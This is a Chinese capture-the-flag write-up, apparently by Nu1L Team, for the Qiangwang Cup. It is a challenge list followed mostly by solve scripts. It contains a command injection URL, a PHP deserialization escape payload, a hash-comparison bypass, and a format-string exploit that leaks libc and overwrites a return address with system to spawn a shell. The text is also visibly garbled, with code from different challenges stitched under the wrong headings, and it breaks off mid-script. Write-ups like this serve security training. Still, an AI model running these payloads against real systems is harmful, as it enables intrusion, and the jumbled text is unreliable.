强网杯-WP
Author:Nu1L Team
强网杯-WP
强网先锋
bank
web辅助
主动
侧防
upload
baby_crt
babymessage
Siri
Funhash
红方辅助
babynotes
Just_a_Galgame
区块链
EasyFake
IPFS
Misc
miscstudy
Crypto
fault
modestudy
Web
easy_java
babewp
half_inﬁltration
dice2cry
Re
aaenc
ﬂower
safe_m2m
ﬁrmware_blob
imitation_game
xx_warmup_obf
Pwn
direct
easyoverﬂow
leak
oldschool
QWBlogin
wingame
easypwn
题目名称|working or done|id
ﬂag格式为ﬂag{}或者QWB{}或者ctf{}
强网先锋
bank
nc 39.101.134.52 8005
web辅助
import string
import hashlib
import itertools
from pwn import *
context.log_level = 'debug'
io = remote('39.101.134.52', 8005)
def passpow(postfix, res):
    for answer in itertools.product(string.ascii_letters+string.digits, 
repeat=3):
        answer = ''.join(answer).encode()
        hashresult = hashlib.sha256(answer+postfix).hexdigest().encode()
        if hashresult == res:
            return answer
io.recvuntil("+")
postfix = io.recvuntil(")")[:-1]
io.recvuntil('== ')
res = io.recvuntil('\n')[:-1]
print(postfix, res)
answer = passpow(postfix, res)
print(answer)
io.sendlineafter(":", answer)
io.sendlineafter(":", "icqaf0ecae2322e454ba574617e58ef7")
io.sendlineafter(":", "Q7")
io.sendlineafter("> ", "view records")
records = io.recvuntil("your cash")[:-9].strip().splitlines()
print(records)
io.sendlineafter("> ", "transact")
io.sendlineafter("> ", "Alice 10")
hsh = io.recvuntil('\n')[:-1]
sender, receiver, amount = hsh[:32], hsh[32:64], hsh[64:]
print(hsh)
print(sender, receiver, amount)
io.sendlineafter("> ", "provide a record")
io.sendlineafter("> ", receiver+sender+amount)
for record in records[1:]:
    receiver = record[32:64]
    amount = record[64:]
    res = receiver+sender+amount
    print('res', res)
    io.sendlineafter("> ", "provide a record")
    io.sendlineafter("> ", res)
io.interactive()
反序列化字符逃逸：
主动
http://39.96.23.228:10002/?ip=127.1;cat%20f*
侧防
upload
pcap提取出一个上传的jpg，根据提示用了steghide和一个密码，测一下弱口令，123456成功解开拿到
ﬂag
baby_crt
题目给出了一个Fault attack on CRT-RSA的场景， 爆破t1，k求gcd(m^f(c1)-f(sig)^e%n,n)分解n即可。
topsolo::TP=>midsolo::=>invoke=>Gank=>junjle::__tostring
http://eci-2ze06zq9b84jbri1qjsz.cloudeci1.ichunqiu.com/?
username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&passw
ord=ven%22;s:1:%22a%22;O:7:%22topsolo%22:1:
{S:7:%22%00*%00n\61me%22;O:7:%22midsolo%22:3:
{S:7:%22%00*%00n\61me%22;O:6:%22jungle%22:1:
{S:7:%22%00*%00n\61me%22;s:7:%22Lee%20Sin%22;}}}s:8:%22nu1lctf1%22;s:1:%221
import fuckpy3
t1 = '4C787C64545577655C49764E6843424F'.unhex()
t2 = '4C71444E66577D496D465A4374697978'.unhex()
t3 = '4462655E57505C4F'.unhex()[::-1]
t = t1+t2+t3
table = b'QWBlogs'
flag = ''
for idx in range(len(t)):
    i = idx - idx % 4
    j = (idx % 4 + 1) % 4
    flag += chr((t[i+j]-65) ^ table[idx % 7])
print(flag)
from Crypto.Util.number import getPrime, long_to_bytes, getStrongPrime
from hashlib import sha1
import libnum
import math
primeList = []
for num in range(2**15+1, 2**16, 2):
    if all(num % i != 0 for i in range(2, int(math.sqrt(num))+1)):
        primeList.append(num)
32768, 65536
e = 65537
# assert p >>","Hey Siri!")
    s.recvuntil(">>> What Can I do for you?")
    s.sendafter(">>>","Remind me to "+buf)
# gdb.attach(s,"b *$rebase(0x129d)\nc")
# fmtstr_payload()
payload = 'A'*5+'%87$pBBBB%44$pDDDD'
say(payload)
s.recvuntil("A"*5)
pie = int(s.recvuntil("B"*4,drop=True),16)-0x1368
success(hex(pie))
stack = int(s.recvuntil("D"*4,drop=True),16)-0x118
success(hex(stack))
payload = 'A'*5+'%15$sBBB'+p64(puts_got+pie)
say(payload)
s.recvuntil("A"*5)
puts = u64(s.recvuntil("BBB",drop=True)+"\x00"*2)
libc = ELF("./libc.so.6")
offset = puts-libc.sym['puts']
success(hex(offset))
system = offset+0x10a45c
# payload = 'A'*12+fmtstr_payload(15,
{stack:system+libc},numbwritten=39,write_size='short').replace('lln','hn')
payload = 
'A'*3+FmtPayload.fmt_payload(15,stack,system,n=3,written=30,typex='short')
for i in range(3):
    payload = payload.replace("%"+str(20+i)+"$hn","%"+str(55+i)+"$hn")
print payload
success(hex(len(payload)))
success(hex(system))
say(payload)
s.interactive()
Funhash
http://39.101.177.96/?
hash1=0e001233333333333334557778889&hash2[]=1&hash3[]=2&hash4=ﬃfdyop
红方辅助
'''
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL
0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
#encoding:utf-8
import socket
import struct
import multiprocessing
import random
from hashlib import md5, sha256
from pwn import *
def dec(data, fn, salt,btime):
    funcs = {
        "1" : lambda x, y : x - y,
        "0" : lambda x, y : x + y,
        "2" : lambda x, y : x ^ y # lambda x, y : x ^ y
    }
    offset = {
        "0" : 0xefffff,
        "1" : 0xefffff,
        "2" : 0xffffff,
    }
    # length = len(data) + 10
    # fn = str(random.randint(0, 65535) % 3).encode()
    t = struct.unpack("<i", btime)[0]
    boffset = offset[fn.decode()]
    t -= boffset
    t = struct.pack("<i", t)
    # enc = struct.pack("<IIcB", count, length, fn, salt)
    dec = ''
    i = 0 
    for c in data:
        tt = funcs[fn.decode()](ord(c),salt) % 256
        dec += chr(tt ^ ord(t[i]))
        i = (i + 1) % 4
babynotes
    return dec
f = open('data.txt','r')
d = f.read()
f.close()
d = d.splitlines()
for i in xrange(len(d)/5):
    assert 'G' == d[i*5].decode('hex')
    time = d[i*5 + 1].decode('hex')
    of = d[i*5 + 2].decode('hex')
    da = d[i*5 + 3].decode('hex')[8:]
    fn = da[0]
    salt = ord(da[1])
    j = d[i*5 + 4].decode('hex')
    print(dec(da[2:],fn ,salt,time))
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
context(arch = 'amd64' , os = 'linux', log_level='debug')